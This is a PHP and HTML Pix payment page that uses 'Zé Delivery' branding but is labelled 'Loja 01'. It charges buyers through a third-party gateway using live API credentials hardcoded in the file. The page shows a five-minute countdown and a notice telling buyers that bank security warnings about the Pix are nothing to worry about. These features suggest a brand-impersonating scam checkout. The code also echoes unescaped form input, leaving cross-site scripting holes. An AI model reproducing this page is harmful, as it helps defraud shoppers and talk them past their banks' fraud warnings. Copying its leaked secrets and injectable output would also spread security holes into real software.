<?php
// payment.php

// Configuration
$clientId = "dice_live_0b5adcb282e250521856f84f060c749d";
$clientSecret = "dicesk_live_27f3d80af88c9ee279d5733edfcbc9828391fb4eccbbaf89";
$baseUrl = "https://api.use-dice.com";
$error = null;
$qrCodeText = "";
$transactionId = "";

// Only process if it's a POST request (coming from checkout)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $amount = filter_input(INPUT_POST, 'total_amount', FILTER_VALIDATE_FLOAT);
    $name = $_POST['name'] ?? 'Cliente';
    $email = $_POST['email'] ?? 'email@teste.com';
    $cpf = $_POST['cpf'] ?? '00000000000';
    $prodName = $_POST['product_name'] ?? 'Zé Delivery - Pedido';
    $prodPrice = $_POST['product_price'] ?? '79,90';
    // Clean CPF
    $cpf = preg_replace('/\D/', '', $cpf);
    
    if (!$amount || $amount < 2.00) $amount = 2.00; // Minimum requirement

    // 1. Authenticate
    $ch = curl_init($baseUrl . '/api/v1/auth/login');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'client_id' => $clientId,
        'client_secret' => $clientSecret
    ]));

    $authResponse = curl_exec($ch);
    $authCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($authCode === 200 || $authCode === 201) {
        $authData = json_decode($authResponse, true);
        $token = $authData['token'] ?? $authData['access_token'] ?? null;

        if ($token) {
            // 2. Create Payment (V2)
            $payload = [
                "product_name" => $prodName,
                "amount" => floatval($amount),
                "payer" => [
                    "name" => $name,
                    "email" => $email,
                    "document" => $cpf
                ]
            ];

            $ch = curl_init($baseUrl . '/api/v2/payments/deposit');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                "Authorization: Bearer $token",
                "Content-Type: application/json"
            ]);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));

            $paymentResponse = curl_exec($ch);
            $payCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            $paymentData = json_decode($paymentResponse, true);

            if ($payCode === 200 || $payCode === 201) {
                // Success
                $qrCodeText = $paymentData['qr_code_text'] ?? '';
                $transactionId = $paymentData['transaction_id'] ?? $paymentData['id'] ?? '';

                // Logger & Persistence (Preserved from previous implementation)
                require_once 'Logger.php';
                Logger::logSection("CLIENTE CHEGOU NO PIX");
                Logger::log("[PIX] QR Code gerado com sucesso");
                Logger::log("[PIX] Transação ID: " . $transactionId);
                Logger::log("[PIX] Valor: R$ " . number_format($amount, 2, ',', '.'));

                $orderData = [
                    'transaction_id' => $transactionId,
                    'amount' => floatval($amount),
                    'product_name' => $prodName,
                    'user_data' => [
                        'fn' => explode(' ', $name)[0],
                        'ln' => explode(' ', $name)[1] ?? '',
                        'em' => $email,
                        'ph' => $_POST['phone'] ?? '', 
                        'ct' => $_POST['city'] ?? '',
                        'st' => $_POST['uf'] ?? '', 
                        'country' => 'br'
                    ]
                ];
                
                if (!is_dir('orders')) mkdir('orders', 0777, true);
                file_put_contents("orders/{$transactionId}.json", json_encode($orderData));
                
            } else {
                $error = "Erro ao gerar PIX (API Payment): " . ($paymentData['message'] ?? 'Desconhecido');
                require_once 'Logger.php';
                Logger::log("Payment.php Error: " . $error);
            }
        } else {
            $error = "Erro ao autenticar (Token missing).";
        }
    } else {
        $error = "Erro ao autenticar na API Dice.";
    }
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Pix - Zé Delivery</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Mulish:wght@400;500;600;700;800&display=swap');

        :root {
            --primary-yellow: #fec400; /* Adjusted to image 1 yellow */
            --text-dark: #222;
            --text-gray: #666;
            --bg-yellow: #ffcc00; 
        }

        body {
            font-family: 'Mulish', sans-serif;
            margin: 0;
            padding: 20px 0;
            background-color: var(--bg-yellow);
            color: var(--text-dark);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            box-sizing: border-box;
        }

        .ticket-container {
            width: 100%;
            max-width: 380px; /* Slightly narrower like receipt */
            background: white;
            border-radius: 12px;
            position: relative;
            margin: 0 15px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            /* overflow: hidden; Removed to allow cutouts to be perfectly placed if needed, but keeping for corner radius */
        }

        /* HEADER */
        .header {
            padding: 20px 25px 25px 25px; /* Extra bottom padding */
            border-bottom: 2px dashed #ececec;
            position: relative;
        }

        .store-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }

        .store-name {
            font-weight: 800;
            font-size: 0.9em;
        }

        .pix-icon {
            color: #99aab5; /* Greyish icon in image 1 top right */
            font-size: 1.5em; 
        }
        
        .page-title {
            font-size: 1.3em;
            font-weight: 500; /* Regular weight as per image 1 */
            color: #222;
            margin: 0;
        }

        /* CUSTOMER INFO */
        .info-section {
            padding: 0; /* Padding handled in header content flow */
        }

        /* VALUES & TIMER */
        .price-container { display: flex; align-items: flex-start; }
        .price-symbol { color: var(--primary-yellow); font-weight: 800; font-size: 0.9em; margin-right: 2px; margin-top: 5px;}
        .price-val { font-size: 2.2em; font-weight: 900; line-height: 1; color: #222; letter-spacing: -1px; }

        .timer-wrapper { text-align: right; }
        .timer-label { font-size: 0.65em; font-weight: 800; margin-bottom: 3px; letter-spacing: 0.5px; }
        .timer-digits { display: flex; gap: 3px; font-weight: 800; font-size: 0.9em; align-items: center; }
        .digit-box { background: var(--primary-yellow); padding: 3px 6px; border-radius: 3px; color: black; line-height: 1; }

        /* QR CODE AREA */
        .qr-area {
            text-align: center;
            padding: 10px 25px 20px;
        }
        
        .qr-instruction {
            font-size: 0.85em;
            color: #555;
            margin-bottom: 15px;
        }

        .qr-box {
            border: 1px dashed #bbb;
            display: inline-block;
            padding: 8px;
            border-radius: 8px;
            margin-bottom: 15px;
        }
        .qr-box img { display: block; max-width: 100%; }

        /* INPUT & BUTTONS */
        .copy-field {
            background: #fcfcfc;
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            padding: 10px;
            font-family: monospace;
            color: #888;
            font-size: 0.75em;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            margin-bottom: 15px;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
        }

        .btn {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            font-weight: 800;
            font-size: 0.9em;
            cursor: pointer;
            border: none;
            margin-bottom: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }

        .btn-yellow {
            background-color: var(--primary-yellow);
            color: black;
            box-shadow: 0 4px 0 #eeb200;
            margin-bottom: 15px; /* Space for shadow */
        }
        
        /* WARNING BOX */
        .warning-box {
            margin: 10px 25px;
            border: 1px solid #ffeace;
            background: #fffdf5; /* Or pure white with yellow border */
            border: 1px solid #fcecae; 
            padding: 12px;
            border-radius: 10px;
            display: flex;
            gap: 10px;
            align-items: flex-start;
        }
        .warning-icon { color: #f5a623; font-size: 1.1em; margin-top: 2px; }
        .warning-text { font-size: 0.7em; color: #666; line-height: 1.35; text-align: left; }
        .warning-text b { color: #dfa600; }
        
        /* SAIBA MAIS */
        .saiba-mais {
             background: white; border: 1px solid #fcecae; border-radius: 8px; padding: 10px; margin: 0 25px 20px; font-weight: bold; font-size: 0.75em; color: #f5a623; display: flex; justify-content: space-between; align-items: center; cursor: pointer;
        }

        /* INSTRUCTIONS / STEPS */
        .steps-container {
            padding: 0 25px 20px;
        }
        .steps-intro { font-size: 0.8em; color: #555; margin-bottom: 15px; text-align: left; }
        
        .step-row {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
            align-items: flex-start;
        }
        .step-badge {
            background: var(--primary-yellow);
            color: black;
            font-weight: 800;
            font-size: 0.65em;
            padding: 3px 6px;
            border-radius: 4px;
            white-space: nowrap;
            margin-top: 1px;
        }
        .step-desc {
            font-size: 0.75em;
            color: #666;
            line-height: 1.3;
        }

        /* SUMMARY FOOTER */
        .summary-footer {
            border-top: 2px dashed #ececec;
            padding: 20px 25px;
            background: #fff; /* Ensure clean background */
            position: relative;
        }
     
        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 0.8em;
            color: #666;
        }
        .summary-item.total {
            font-weight: 800;
            color: #333;
            font-size: 1em;
            margin-top: 15px;
            padding-top: 10px;
            border-top: 1px solid #f9f9f9;
        }
        
        .frete-tag {
            background: var(--primary-yellow);
            padding: 2px 6px;
            border-radius: 3px;
            font-weight: 800;
            font-size: 0.8em;
            color: black;
        }

        .error-overlay {
            position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.9); 
            display:flex; justify-content:center; align-items:center; z-index:999; flex-direction: column;
        }
        
        /* Cutout Base Classes */
        .cutout { position: absolute; width: 20px; height: 20px; background: var(--bg-yellow); border-radius: 50%; z-index: 10; }
        /* Positioned Cutouts */
        .c-1 { left: -10px; top: 120px; } /* Header Sep Left */
        .c-2 { right: -10px; top: 120px; } /* Header Sep Right */
        
        /* Bottom cutout needs auto-calc via JS or fixed position if height is known. 
           Since footer is relative, we use negative margins/positioning on footer elements */
        .footer-cutout-l { left: -10px; top: -11px; }
        .footer-cutout-r { right: -10px; top: -11px; }

    </style>
</head>
<body>

<?php if($error): ?>
    <div class="error-overlay">
        <div style="color: red; font-weight: bold; margin-bottom: 20px; text-align: center; padding: 20px;">
            <?php echo $error; ?>
        </div>
        <a href="checkout.php" class="btn btn-yellow" style="width: 200px;">Tentar Novamente</a>
    </div>
<?php endif; ?>

<div class="ticket-container">
    <div class="cutout c-1"></div>
    <div class="cutout c-2"></div>

    <div class="header">
        <div class="store-header">
            <span class="store-name">Loja 01</span>
            <!-- Simple logo shape or icon -->
            <i class="fa-solid fa-shapes" style="color: #9aa; font-size: 1.2em;"></i>
        </div>
        
        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px;">
            <h1 class="page-title">Pagamento via Pix</h1>
            <div style="text-align: right; color: #666; font-size: 0.75em; line-height: 1.5;">
                 <!-- Date: 23 dez 2025 -->
                 <?php 
                    $months = ['dez', 'jan', 'fev', 'mar', 'abr', 'mai', 'jun', 'jul', 'ago', 'set', 'out', 'nov'];
                    // Just raw mapping for simple demo if needed or use date logic
                    $mIndex = date('n'); // 1-12
                    // Rotate array to match? No, just map 1->jan
                    $ptMonths = [1=>'jan', 2=>'fev', 3=>'mar', 4=>'abr', 5=>'mai', 6=>'jun', 7=>'jul', 8=>'ago', 9=>'set', 10=>'out', 11=>'nov', 12=>'dez'];
                    $curMonth = $ptMonths[date('n')];
                    $dateStr = date('d') . ' ' . $curMonth . ' ' . date('Y');
                 ?>
                 <div><i class="fa-regular fa-calendar" style="margin-right:3px;"></i> <?php echo $dateStr; ?></div>
                 <div>ID <?php echo strtoupper(substr($transactionId, 0, 10)); ?></div>
            </div>
        </div>

        <div style="font-weight: 800; font-size: 0.9em; color: #222; margin-bottom: 20px;">
            <?php echo $prodName; ?>
        </div>

        <!-- Customer Grid: Left (Email/CPF) - Right (Address) -->
        <div style="display: flex; gap: 15px; font-size: 0.75em; color: #555; align-items: flex-start;">
            <div style="flex: 1; min-width: 0;">
                <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 5px;">
                    <i class="fa-regular fa-envelope" style="width: 14px;"></i> 
                    <span style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;"><?php echo $_POST['email'] ?? 'email@...'; ?></span>
                </div>
                <div style="display: flex; align-items: center; gap: 6px;">
                    <i class="fa-regular fa-id-card" style="width: 14px;"></i> 
                    <span><?php echo $_POST['cpf'] ?? '000.***.***-**'; ?></span>
                </div>
            </div>
            
            <div style="flex: 1.2; min-width: 0;">
                <div style="display: flex; gap: 6px; align-items: flex-start;">
                    <i class="fa-solid fa-location-dot" style="margin-top: 2px; width: 14px;"></i>
                    <div style="line-height: 1.4;">
                        <div style="color: #666;">CEP <?php echo $_POST['cep'] ?? '00000-000'; ?></div>
                        <div><?php echo $_POST['street'] ?? 'Rua...'; ?></div>
                        <div>n. <?php echo $_POST['number'] ?? '00'; ?>, <?php echo $_POST['neighborhood'] ?? ''; ?></div>
                        <div><?php echo $_POST['city'] ?? ''; ?> - <?php echo $_POST['uf'] ?? 'BR'; ?></div>
                        <div style="text-decoration: underline; font-weight: bold; color: black; margin-top: 4px; cursor: pointer;">Corrigir endereço</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Padding for separation -->
    <div style="padding: 25px 25px 10px;">
        <div style="display: flex; justify-content: space-between; align-items: flex-end;">
             <div>
                 <div style="font-size: 0.7em; font-weight: 800; margin-bottom: 5px; color: #333;">Total</div>
                 <div class="price-container">
                     <span class="price-symbol">R$</span>
                     <span class="price-val"><?php echo number_format($_POST['total_amount'] ?? 79.90, 2, ',', '.'); ?></span>
                 </div>
             </div>
             <div class="timer-wrapper">
                 <div class="timer-label">Expira em</div>
                 <div class="timer-digits">
                     <i class="fa-regular fa-clock" style="margin-right: 5px; margin-top: 2px; font-weight: 400;"></i>
                     <span class="digit-box" id="timer-min">04</span><span style="margin: 0 2px;">:</span><span class="digit-box" id="timer-sec">59</span>
                 </div>
             </div>
        </div>
        
        <div style="text-align: center; margin-top: 20px; font-size: 0.85em; color: #444;">Escaneie o QR CODE ou copie o código</div>
    </div>


    <div class="qr-area">
        <div class="qr-box">
             <!-- JS will inject QR here -->
             <div id="qrcode-container"></div>
        </div>
        
        <input type="text" class="copy-field" value="<?php echo $qrCodeText; ?>" readonly onclick="this.select();">
        
        <button class="btn btn-yellow" onclick="copyPix()">
            Copiar código <i class="fa-regular fa-copy"></i>
        </button>
        
        <button class="btn btn-yellow" onclick="checkStatusManual()" style="margin-bottom: 0;">
            Confirmar Pagamento <i class="fa-solid fa-check"></i>
        </button>
    </div>

    <div class="warning-box">
        <i class="fa-solid fa-circle-info warning-icon"></i>
        <div class="warning-text">
            <b>Atenção:</b><br>
            Os bancos reforçaram a segurança do Pix e podem exibir avisos preventivos.<br>
            Não se preocupe, sua transação está protegida.
        </div>
    </div>

    <div class="saiba-mais">
        <span>Saiba mais</span>
        <i class="fa-solid fa-chevron-down" style="font-size: 0.8em;"></i>
    </div>

    <div class="steps-container">
        <div class="steps-intro">Para finalizar sua compra, compense o Pix no prazo limite.</div>
        
        <div class="step-row">
            <div class="step-badge">PASSO 1</div>
            <div class="step-desc">Abra o app do seu banco e entre no ambiente Pix;</div>
        </div>
        <div class="step-row">
            <div class="step-badge">PASSO 2</div>
            <div class="step-desc">Escolha Pagar com QR Code e aponte a câmera para o código acima, ou cole o código identificador da transação;</div>
        </div>
        <div class="step-row">
            <div class="step-badge">PASSO 3</div>
            <div class="step-desc">Confirme as informações e finalize sua compra.</div>
        </div>
    </div>

    <div class="summary-footer">
        <!-- Footer Cutouts -->
        <div class="cutout footer-cutout-l"></div>
        <div class="cutout footer-cutout-r"></div>

        <div class="summary-item">
            <span><?php echo $prodName; ?></span>
            <span style="font-weight: 800; color: #333;">R$ <?php echo $prodPrice; ?></span>
        </div>
        
        <?php if(isset($_POST['upsell_gelo']) && $_POST['upsell_gelo'] == '1'): ?>
        <div class="summary-item">
            <span>Água Mineral 500ml (x1)</span>
            <span style="font-weight: 800; color: #333;">R$ 3,00</span>
        </div>
        <?php endif; ?>
        
        <?php if(isset($_POST['upsell_carvao']) && $_POST['upsell_carvao'] == '1'): ?>
        <div class="summary-item">
            <span>Brownie de Chocolate (x1)</span>
            <span style="font-weight: 800; color: #333;">R$ 6,00</span>
        </div>
        <?php endif; ?>

        <div class="summary-item">
            <span>Frete</span>
            <span class="frete-tag">GRÁTIS</span>
        </div>
        
        <div class="summary-item total">
            <span>Total</span>
            <span>R$ <?php echo number_format($_POST['total_amount'] ?? 79.90, 2, ',', '.'); ?></span>
        </div>
    </div>
</div>

<script>
    const qrText = "<?php echo $qrCodeText; ?>";
    const transactionId = "<?php echo $transactionId; ?>";

    if(qrText && document.getElementById("qrcode-container")) {
        new QRCode(document.getElementById("qrcode-container"), {
            text: qrText,
            width: 180,
            height: 180,
            colorDark : "#000000",
            colorLight : "#ffffff",
            correctLevel : QRCode.CorrectLevel.H
        });
    }

    function copyPix() {
        if(!qrText) return;
        navigator.clipboard.writeText(qrText).then(() => {
            alert("Código Pix copiado com sucesso!");
        });
    }

    // Timer Logic
    let time = 300; // 5 min
    const minEl = document.getElementById('timer-min');
    const secEl = document.getElementById('timer-sec');

    function updateTimerDisplay(m, s) {
        let mStr = m.toString().padStart(2, '0');
        let sStr = s.toString().padStart(2, '0');
        if(minEl) { minEl.textContent = mStr; secEl.textContent = sStr; }
    }

    setInterval(() => {
        if(time > 0) {
            time--;
            let m = Math.floor(time / 60);
            let s = time % 60;
            updateTimerDisplay(m, s);
        }
    }, 1000);

    // Status polling
    function checkStatus() {
        if(!transactionId) return;

        fetch('check_status.php?transaction_id=' + transactionId)
            .then(res => res.json())
            .then(data => {
                if(data.status === 'COMPLETED' || data.status === 'PAID') {
                     alert("Pagamento Aprovado! Redirecionando...");
                     // window.location.href = 'obrigado.php';
                }
            })
            .catch(e => console.error(e));
    }

    function checkStatusManual() {
        checkStatus();
        alert("Estamos verificando seu pagamento junto ao banco...");
    }

    if(transactionId) setInterval(checkStatus, 5000);

</script>
</body>
</html>
